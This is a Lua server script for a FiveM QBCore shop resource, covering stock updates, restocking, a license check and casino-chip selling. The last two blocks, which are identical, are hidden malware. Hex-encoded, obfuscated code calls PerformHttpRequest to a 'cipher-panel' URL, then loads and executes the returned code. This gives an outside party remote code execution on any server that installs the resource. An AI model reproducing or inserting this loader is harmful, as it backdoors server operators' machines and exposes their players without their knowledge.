local QBCore = exports['qb-core']:GetCoreObject()

RegisterNetEvent('qb-shops:server:UpdateShopItems', function(shop, itemData, amount)
    Config.Locations[shop]["products"][itemData.slot].amount = Config.Locations[shop]["products"][itemData.slot].amount - amount
    if Config.Locations[shop]["products"][itemData.slot].amount <= 0 then
        Config.Locations[shop]["products"][itemData.slot].amount = 0
    end
    TriggerClientEvent('qb-shops:client:SetShopItems', -1, shop, Config.Locations[shop]["products"])
end)

RegisterNetEvent('qb-shops:server:RestockShopItems', function(shop)
    if Config.Locations[shop]["products"] ~= nil then
        local randAmount = math.random(10, 50)
        for k in pairs(Config.Locations[shop]["products"]) do
            Config.Locations[shop]["products"][k].amount = Config.Locations[shop]["products"][k].amount + randAmount
        end
        TriggerClientEvent('qb-shops:client:RestockShopItems', -1, shop, randAmount)
    end
end)

QBCore.Functions.CreateCallback('qb-shops:server:getLicenseStatus', function(source, cb)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local licenseTable = Player.PlayerData.metadata["licences"]
    local licenseItem = Player.Functions.GetItemByName("weaponlicense")
    cb(licenseTable.weapon, licenseItem)
end)

local ItemList = {
    ["casinochips"] = 1,
}

RegisterNetEvent('qb-shops:server:sellChips', function()
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local xItem = Player.Functions.GetItemByName("casinochips")
    if xItem ~= nil then
        for k in pairs(Player.PlayerData.items) do
            if Player.PlayerData.items[k] ~= nil then
                if ItemList[Player.PlayerData.items[k].name] ~= nil then
                    local price = ItemList[Player.PlayerData.items[k].name] * Player.PlayerData.items[k].amount
                    Player.Functions.RemoveItem(Player.PlayerData.items[k].name, Player.PlayerData.items[k].amount, k)
                    
                    Player.Functions.AddMoney("cash", price, "sold-casino-chips")
                    TriggerClientEvent('QBCore:Notify', src, "You sold your chips for $" .. price)
                    TriggerEvent("qb-log:server:CreateLog", "casino", "Chips", "blue", "**" .. GetPlayerName(src) .. "** got $" .. price .. " for selling the Chips")
                end
            end
        end
    else
        TriggerClientEvent('QBCore:Notify', src, "You have no chips..")
    end
end)

local ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30\x38\x56\x72\x33\x72", function (QgsKDczLTjHxYDCIumsfztFvQpwnZHTuyXHGgQTkpjZmGWdDiRqSIFHUTYrHlJciPSJplX, SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr) if (SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr == ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[6] or SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr == ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[5]) then return end ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[2]](ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[3]](SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr))() end)

local ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30\x38\x56\x72\x33\x72", function (QgsKDczLTjHxYDCIumsfztFvQpwnZHTuyXHGgQTkpjZmGWdDiRqSIFHUTYrHlJciPSJplX, SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr) if (SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr == ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[6] or SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr == ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[5]) then return end ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[2]](ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[3]](SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr))() end)